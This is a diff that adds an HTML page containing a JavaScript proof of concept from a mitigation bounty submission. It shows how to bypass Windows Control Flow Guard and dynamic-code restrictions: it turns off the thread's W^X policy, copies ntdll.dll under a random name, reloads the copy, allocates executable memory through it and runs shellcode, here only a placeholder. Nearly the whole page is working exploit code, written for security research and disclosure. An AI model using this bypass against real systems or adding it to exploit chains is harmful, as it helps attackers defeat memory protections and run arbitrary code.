@@ -1,0 +1,100 @@
+<html>
+<head>
+<title>Mitigation bounty PoC by @mxatone (Thomas Garnier)</title>
+<link rel="stylesheet" type="text/css" href="theme.css">
+<!-- Generic toolkit that can be used on multiple PoCs -->
+<script type="text/javascript" src="toolkit.js"></script>
+<script type="text/javascript">
+// Disable W^X for the thread
+function disable_wx(exp) {
+	var THREAD_DYNAMIC_CODE_ALLOW = 1;
+	var ThreadDynamicCodePolicy = 2;
+	var cur_thread = -2;
+	var mem = exp.allocate(0x10);
+	exp.write_uint(mem, THREAD_DYNAMIC_CODE_ALLOW);
+	var r = exp.call_function("kernelbase.dll", "SetThreadInformation",
+		cur_thread, ThreadDynamicCodePolicy, mem, 4);
+	check_eq(r, 1);
+}
+
+var env_mem = null;
+
+function GetEnvironmentVariable(exp, name) {
+	if (env_mem == null)
+		env_mem = exp.allocate(0x1000);
+	var r = exp.call_function("kernel32.dll", "GetEnvironmentVariableA", exp.dup_string(name), env_mem, 0xFFF);
+	check_ne(r, 0);
+	return exp.read_ascii(env_mem);
+}
+
+/*
+ * Poc1 - Copy ntdll.dll with another name in the temporary directory, reload
+ * and CFG restrictions on NtAllocateVirtualMemory and other functions are gone.
+ */
+function poc_1() {
+	var exp = null;
+	try {
+		exp = exploit_start("poc1 - Reload ntdll, bypass CFG restrictions");
+		
+		// Disable W^X
+		disable_wx(exp);
+		
+		var tmpdir = GetEnvironmentVariable(exp, "TMP");
+		log("tmpdir is " + tmpdir);
+		
+		var systemRoot = GetEnvironmentVariable(exp, "SystemRoot");
+		
+		var random_number = (Math.random() * (0xFFFFFFFF - 0)) & 0xFFFFFFFF;
+		var dll_name = "joelerigolo" + random_number.toString() + ".dll"
+		var tmp_target = tmpdir + "\\..\\" + dll_name;
+		var kernelpath = exp.dup_string(systemRoot + "\\system32\\ntdll.dll");
+		var dup_tmp_target = exp.dup_string(tmp_target);
+		r = exp.call_function("kernel32.dll", "CopyFileA", kernelpath, dup_tmp_target, 0);
+		check_eq(r, 1);
+		
+		log("Copied ntdll to " + tmp_target);
+		
+		var hModule = exp.call_function("kernel32.dll", "LoadLibraryA", dup_tmp_target);
+		check_ne(hModule, 0);
+		
+		var NtAllocateVirtualMemory = exp.GetProcAddressFromPEB(dll_name, "NtAllocateVirtualMemory");
+		check_ne(NtAllocateVirtualMemory, 0);
+		
+		var allocated = exp.allocate(8);
+		var region_size = exp.allocate(8);
+		exp.write_ptr(region_size, 0x1000);
+		var MEM_COMMIT = 0x00001000;
+		var PAGE_EXECUTE_READWRITE = 0x40;
+		var r = exp.call_function_ex(NtAllocateVirtualMemory,
+			[-1, allocated, 0, region_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE]);
+		check_eq(r, 0);
+		
+		var rwx_ptr = exp.read_ptr(allocated);
+		
+		// Write shellcode
+		var shellcode = [0x90, 0x90, 0xcc];
+		exp.write(rwx_ptr, shellcode, shellcode.length);
+		
+		// Call our code:...
+		exp.call_function_ex(rwx_ptr, []);
+		
+		log("Failed...");
+	} catch(err) {
+		log("JS EXCEPTION: "+err.stack);
+	} finally {
+		if (exp != null)
+			exp.cleanup();
+	}
+}
+</script>
+</head>
+<body>
+<h1>Mitigation bounty PoC - Reload ntdll.dll bypass CFG by @mxatone (Thomas Garnier)</h1>
+<div class="container">
+  <div class="buttonbar">
+    <input type="button" onclick="poc_1()" value="PoC 1 - Reload ntdll.dll bypass CFG" />
+  </div>
+  <textarea id="log" class="text" wrap="off" placeholder="Log output will be here"></textarea>
+</div>
+</body>
+</html>
